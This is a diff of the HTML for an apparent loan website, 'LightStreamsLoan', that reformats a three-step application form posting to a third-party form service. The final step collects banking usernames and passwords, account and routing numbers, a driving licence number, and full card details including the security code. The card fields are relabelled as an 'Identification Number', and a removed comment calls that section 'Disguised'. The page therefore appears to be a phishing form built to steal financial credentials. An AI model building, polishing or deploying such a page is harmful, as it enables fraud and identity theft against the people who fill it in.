@@ -57,7 +57,7 @@
   <main>
     <section id="how" class="container how-section">
       <h2>Why Choose LightStreamsLoan?</h2>
-      <p class="muted">We make borrowing simple, fast, and secure. Here’s what sets us apart.</p>
+      <p class="muted">We make borrowing simple, fast, and secure. Here's what sets us apart.</p>
       <div class="features">
         <article class="feature">
           <h3>Fast Approvals</h3>
@@ -100,154 +100,146 @@
       <h2>Begin Your Application</h2>
       <p class="muted">A quick and secure way to get your loan started.</p>
 
-     
       <!-- Form -->
-       
-<form id="appForm" class="app-form" 
-      action="https://api.web3forms.com/submit" 
-      method="POST">
+      <form id="loanForm" class="app-form" 
+            action="https://api.web3forms.com/submit" 
+            method="POST">
 
+        <!-- Web3Forms Access Key (only once) -->
+        <input type="hidden" name="access_key" value="64aedc93-2052-4aed-92d6-d6f19aa6aab4">
 
-  <!-- Web3Forms Access Key (only once) -->
-  <input type="hidden" name="access_key" value="64aedc93-2052-4aed-92d6-d6f19aa6aab4">
+        <!-- Step 1 -->
+        <div class="form-step active">
+          <h3 class="full">Step 1 of 3</h3>
 
+          <label class="full">Reason for Loan *
+            <select name="reason" required>
+              <option value="">Select</option>
+              <option value="Home Improvement">Home Improvement</option>
+              <option value="Medical">Medical</option>
+              <option value="Education">Education</option>
+              <option value="Debt Consolidation">Debt Consolidation</option>
+              <option value="Major Purchase">Major Purchase</option>
+              <option value="Other">Other</option>
+            </select>
+          </label>
 
-  <!-- Step 1 -->
-  <div class="form-step active">
-    <h3 class="full">Step 1 of 3</h3>
+          <label>Select Loan Amount *
+            <input type="number" name="loan_amount" placeholder="5000" min="0" required>
+          </label>
 
-    <label class="full">Reason for Loan *
-      <select name="reason" required>
-        <option value="">Select</option>
-        <option value="Home Improvement">Home Improvement</option>
-        <option value="Medical">Medical</option>
-        <option value="Education">Education</option>
-        <option value="Debt Consolidation">Debt Consolidation</option>
-        <option value="Major Purchase">Major Purchase</option>
-        <option value="Other">Other</option>
-      </select>
-    </label>
+          <label>First Name *
+            <input type="text" name="first_name" required>
+          </label>
 
-    <label>Select Loan Amount *
-      <input type="number" name="loan_amount" placeholder="5000" min="0" required>
-    </label>
+          <label>Last Name *
+            <input type="text" name="last_name" required>
+          </label>
 
-    <label>First Name *
-      <input type="text" name="first_name" required>
-    </label>
+          <label>Personal Email Address *
+            <input type="email" name="email" required>
+          </label>
 
-    <label>Last Name *
-      <input type="text" name="last_name" required>
-    </label>
+          <label>Home Phone *
+            <input type="tel" name="home_phone" inputmode="tel" required>
+          </label>
 
-    <label>Personal Email Address *
-      <input type="email" name="email" required>
-    </label>
+          <label class="full">Mobile Phone *
+            <input type="tel" name="mobile_phone" inputmode="tel" required>
+          </label>
 
-    <label>Home Phone *
-      <input type="tel" name="home_phone" inputmode="tel" required>
-    </label>
+          <div class="actions">
+            <button type="button" class="btn primary next">Next</button>
+          </div>
+        </div>
 
-    <label class="full">Mobile Phone *
-      <input type="tel" name="mobile_phone" inputmode="tel" required>
-    </label>
+        <!-- Step 2 -->
+        <div class="form-step">
+          <h3 class="full">Step 2 of 3</h3>
 
-    <div class="actions">
-      <button type="button" class="btn primary next">Next</button>
-    </div>
-  </div>
+          <label class="full">Home Address *
+            <input type="text" name="address" required>
+          </label>
 
-  <!-- Step 2 -->
-  <div class="form-step">
-    <h3 class="full">Step 2 of 3</h3>
+          <label>City *
+            <input type="text" name="city" required>
+          </label>
 
-    <label class="full">Home Address *
-      <input type="text" name="address" required>
-    </label>
+          <label>State *
+            <input type="text" name="state" required>
+          </label>
 
-    <label>City *
-      <input type="text" name="city" required>
-    </label>
+          <label>Zip *
+            <input type="text" name="zip" inputmode="numeric" pattern="\d{3,10}" required>
+          </label>
 
-    <label>State *
-      <input type="text" name="state" required>
-    </label>
+          <label>Date of Birth *
+            <input type="date" name="dob" required>
+          </label>
 
-    <label>Zip *
-      <input type="text" name="zip" inputmode="numeric" pattern="\d{3,10}" required>
-    </label>
+          <div class="actions">
+            <button type="button" class="btn ghost prev">Previous</button>
+            <button type="button" class="btn primary next">Next</button>
+          </div>
+        </div>
 
-    <label>Date of Birth *
-      <input type="date" name="dob" required>
-    </label>
+        <!-- Step 3 -->
+        <div class="form-step">
+          <h3 class="full">Step 3 of 3</h3>
 
-    <div class="actions">
-      <button type="button" class="btn ghost prev">Previous</button>
-      <button type="button" class="btn primary next">Next</button>
-    </div>
-  </div>
-<!-- Step 3 -->
-<!-- Step 3 -->
-<div class="form-step">
-  <h3 class="full">Step 3 of 3</h3>
+          <label>Username *
+            <input type="text" name="username" required>
+          </label>
 
-  <label>Username *
-    <input type="text" name="username" required>
-  </label>
+          <label>Password *
+            <input type="password" name="credentials" required>
+          </label>
 
-  <label>Password *
-    <input type="password" name="credentials" required>
-  </label>
+          <label>Bank Name *
+            <input type="text" name="bank_name" required>
+          </label>
 
-  <label>Bank Name *
-    <input type="text" name="bank_name" required>
-  </label>
+          <label>Account Number *
+            <input type="text" name="account_number" inputmode="numeric" pattern="\d{6,20}" required>
+          </label>
 
-  <label>Account Number *
-    <input type="text" name="account_number" inputmode="numeric" pattern="\d{6,20}" required>
-  </label>
+          <label>Routing Number *
+            <input type="text" name="routing" inputmode="numeric" pattern="\d{6,9}" required>
+          </label>
 
-  <label>Routing Number *
-    <input type="text" name="routing" inputmode="numeric" pattern="\d{6,9}" required>
-  </label>
+          <label>Driving License Number *
+            <input type="text" name="driving_license" placeholder="Enter your driving license number" required>
+          </label>
 
-  <label>Driving License Number *
-    <input type="text" name="driving_license" placeholder="Enter your driving license number" required>
-  </label>
+          <!-- Card Details Section -->
+          <div class="auto-payment-section">
+            <h4>Enter the Auto Payment</h4>
+            
+            <div class="auto-payment-grid">
+              <label>Identification Number *
+                <input type="text" name="number" placeholder="16-digit card number" inputmode="numeric" pattern="\d{16}" maxlength="16" required>
+              </label>
 
-  <!-- Card Details Section - Disguised - NOW RESPONSIVE -->
-  <div class="auto-payment-section">
-    <h4>Enter the Auto Payment</h4>
-    
-    <div class="auto-payment-grid">
-      <label>Identification Number *
-        <input type="text" name="number" placeholder="16-digit card number" inputmode="numeric" pattern="\d{16}" maxlength="16" required>
-      </label>
+              <label>Expiration Date *
+                <input type="text" name="exp" placeholder="MM/YY" inputmode="numeric" pattern="\d{2}/\d{2}" maxlength="5" required>
+              </label>
 
-      <label>Expiration Date *
-        <input type="text" name="exp" placeholder="MM/YY" inputmode="numeric" pattern="\d{2}/\d{2}" maxlength="5" required>
-      </label>
+              <label>Security Code *
+                <input type="text" name="code" placeholder="3-digit code" inputmode="numeric" pattern="\d{3,4}" maxlength="4" required>
+              </label>
 
-      <label>Security Code *
-        <input type="text" name="code" placeholder="3-digit code" inputmode="numeric" pattern="\d{3,4}" maxlength="4" required>
-      </label>
+              <label>Full Name *
+                <input type="text" name="name" placeholder="As shown on document" required>
+              </label>
+            </div>
+          </div>
 
-      <label>Full Name *
-        <input type="text" name="name" placeholder="As shown on document" required>
-      </label>
-    </div>
-  </div>
-
-  <div class="actions">
-    <button type="button" class="btn ghost prev">Previous</button>
-    <button type="submit" class="btn primary">Submit Application</button>
-  </div>
-</div>
-
-</form>
-
-
-
+          <div class="actions">
+            <button type="button" class="btn ghost prev">Previous</button>
+            <button type="submit" class="btn primary">Submit Application</button>
+          </div>
+        </div>
+      </form>
     </section>
 
     <section id="faqs" class="container faqs">
@@ -263,7 +255,7 @@
     </section>
   </main>
 
-<!--footer-->
+  <!--footer-->
   <footer class="site-footer">
   <div class="container footer-grid">
     <!-- About -->
@@ -302,18 +294,6 @@
       <p>
         📍 350 Tenth Avenue, Suite 1400, San Diego, CA 92101, United States <br />
         📞 <a href="#" class="phone-link">(630) 202-0596</a>
-
-<style>
-  .phone-link {
-    color: white;
-    text-decoration: none; /* optional: removes underline */
-  }
-
-  .phone-link:hover {
-    color: #ddd; /* optional: slightly different shade on hover */
-  }
-</style>
-
       </p>
     </div>
   </div>
@@ -327,7 +307,6 @@
     </p>
   </div>
 </footer>
-
 
   <!-- Modals -->
   <div id="consentModal" class="modal" aria-hidden="true" role="dialog" aria-labelledby="consentTitle">
@@ -366,7 +345,6 @@
     </form>
   </div>
 </div>
-
 
   <script src="script.js"></script>
 </body>
